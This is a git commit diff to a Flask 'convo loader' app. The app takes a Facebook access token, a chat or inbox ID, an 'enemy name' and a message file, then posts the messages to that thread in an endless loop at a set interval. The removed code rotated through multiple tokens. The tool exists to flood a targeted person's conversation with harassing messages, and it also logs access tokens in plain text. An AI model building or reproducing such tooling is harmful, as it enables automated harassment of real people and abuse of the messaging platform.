ce234a23dcc6fc00026ed21cb8b33601477e9f17
mitraghav <amitraghav8111@gmail.com>
2025-02-24 21:24:45 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,9 +1,9 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request
 import requests
 import os
 from time import sleep
 import time
-
+from datetime import datetime
 app = Flask(__name__)
 app.debug = True
 
@@ -21,81 +21,85 @@ headers = {
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        token_type = request.form.get('tokenType')
         access_token = request.form.get('accessToken')
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
 
-        if token_type == 'single':
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-            while True:
-                try:
-                    for message1 in messages:
-                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        message = str(mn) + ' ' + message1
-                        parameters = {'access_token': access_token, 'message': message}
-                        response = requests.post(api_url, data=parameters, headers=headers)
-                        if response.status_code == 200:
-                            print(f"Message sent using token {access_token}: {message}")
-                        else:
-                            print(f"Failed to send message using token {access_token}: {message}")
-                        time.sleep(time_interval)
-                except Exception as e:
-                    print(f"Error while sending message using token {access_token}: {message}")
-                    print(e)
-                    time.sleep(30)
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(30)
 
-        elif token_type == 'multi':
-            token_file = request.files['tokenFile']
-            tokens = token_file.read().decode().splitlines()
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
-
-            while True:
-                try:
-                    for token in tokens:
-                        for message1 in messages:
-                            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                            message = str(mn) + ' ' + message1
-                            parameters = {'access_token': token, 'message': message}
-                            response = requests.post(api_url, data=parameters, headers=headers)
-                            if response.status_code == 200:
-                                print(f"Message sent using token {token}: {message}")
-                            else:
-                                print(f"Failed to send message using token {token}: {message}")
-                            time.sleep(time_interval)
-                except Exception as e:
-                    print(f"Error while sending message using token {token}: {message}")
-                    print(e)
-                    time.sleep(30)
 
     return '''
+    
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SHAAB JI InSiDe❤️</title>
+  <title>𝐒𝐀𝐑𝐕𝐄𝐑 SHANU </title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    body{
-      background-color: red;
-    }
+    /* CSS for styling elements */
+
+
+
+label{
+    color: Azure blue;
+}
+
+.file{
+    height: 40px;
+}
+body{
+    background-image: url('https://i.imgur.com/QaeCC13.jpeg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    color: white;
+
+}
     .container{
-      max-width: 300px;
-      background-color: bisque;
-      border-radius: 10px;
+      max-width: 350px;
+      height: 600px;
+      border-radius: 20px;
       padding: 20px;
-      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
-      margin: 0 auto;
-      margin-top: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+            border: none;
+            resize: none;
+    }
+        .form-control {
+            outline: 1px red;
+            border: 1px double white ;
+            background: transparent; 
+            width: 100%;
+            height: 40px;
+            padding: 7px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            color: white;
     }
     .header{
       text-align: center;
-      padding-bottom: 10px;
+      padding-bottom: 20px;
     }
     .btn-submit{
       width: 100%;
@@ -103,75 +107,66 @@ def send_message():
     }
     .footer{
       text-align: center;
+      margin-top: 20px;
+      color: #888;
+    }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
       margin-top: 10px;
-      color: blue;
+    }
+    .whatsapp-link i {
+      margin-right: 5px;
     }
   </style>
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="mb-3"> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁
-                                     MADE BY SHAAB JI🤍
-    ENJOY GYS SHAAB S3RV3R  >3:)
-    <h1 class="mt-3">🅾🆆🅽🅴🆁]|I{•------» 7H3 L3G3ND B0II SHAAB JI❤️  </h1>
+  <h1 class="mt-3">𝗦𝗘𝗥𝗩𝗘𝗥 𝗠𝗔𝗦𝗧𝗘𝗥 𝐊𝐀𝐌𝐄𝐄𝐍𝐀 SHANU[𝐅𝐑𝐎𝐌 MEMBERS SHANU BROTHER GANG ]</h1>
   </header>
-
-  <div class="container">
-    <form action="/" method="post" enctype="multipart/form-data">
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
-        <label for="tokenType">Select Token Type:</label>
-        <select class="form-control" id="tokenType" name="tokenType"ent to end encrypted required>
-          <option value="single">Single Token</option>
-          <option value="multi">Multi Token</option>
-        </select>
+        <label for="tokenFile" class="form-label">𝙎𝙀𝙇𝙀𝘾𝙏 𝙔𝙊𝙐𝙍 𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀</label>
+        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
+              </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝙉𝙋 𝙁𝙄𝙇𝙀</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       </div>
       <div class="mb-3">
-        <label for="accessToken">Enter Your Token:</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken">
+        <label for="threadId" class="form-label">𝗖𝗢𝗡𝗩𝗢 𝗨𝗜𝗗{𝗚𝗖/𝗜𝗕}</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
       </div>
       <div class="mb-3">
-        <label for="threadId">Enter Convo/Inbox ID:<ent to end encrypted/label>
-        <input type="text" class="form-control" id="threadId" name="threadId"ent to end encrypted required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx">Enter Hater Name:</label>
+        <label for="kidx" class="form-label">𝗘𝗡𝗘𝗠𝗬 𝗡𝗔𝗠𝗘</label>
         <input type="text" class="form-control" id="kidx" name="kidx" required>
       </div>
       <div class="mb-3">
-        <label for="txtFile">Select Your Notepad File:</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-      </div>
-      <div class="mb-3" id="multiTokenFile" style="display: none;">
-        <label for="tokenFile">Select Token File (for multi-token):</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
-      </div>
-      <div class="mb-3">
-        <label for="time">Speed in Seconds:</label>
+        <label for="time" class="form-label">𝙏𝙄𝙈𝙀 (𝙎𝙀𝘾𝙊𝙉𝘿𝙎)</label>
         <input type="number" class="form-control" id="time" name="time" required>
       </div>
-      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+      <button type="submit" class="btn btn-primary btn-submit">𝗥𝗨𝗡</button>
     </form>
-        <form method="post" action="/stop">
+    <form method="post" action="/stop">
       <button type="submit" class="btn btn-danger btn-submit mt-3">𝗦𝗧𝗢𝗣</button>
     </form>
   </div>
   <footer class="footer">
-    <p>&copy; Developed by L3g3nd SHAAB 2024. All Rights Reserved.</p>
-    <p>Convo/Inbox Loader Tool</p>
-    <p>Keep enjoying  <a href="https://github.com/dashboard">GitHub</a></p>
+    <p>&copy; 𝗔𝗩𝗘𝗡𝗚𝗘𝗥 SHANU 𝗢𝗡 𝗙𝗜𝗥𝗘 </p>
+    <p><a href="https://wa.me/+91 7495077317" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 </a></p>
+    <div class="mb-3">
+      <a href="https://www.facebook.com/dhariyashaab">𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏</a>
+    </div>
   </footer>
-
-  <script>
-    document.getElementById('tokenType').addEventListener('change', function() {
-      var tokenType = this.value;
-      document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
-      document.getElementById('accessToken').style.display = tokenType === 'multi' ? 'none' : 'block';
-    });
-  </script>
 </body>
 </html>
-    '''
+ '''
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=port)
+    app.run(debug=True)
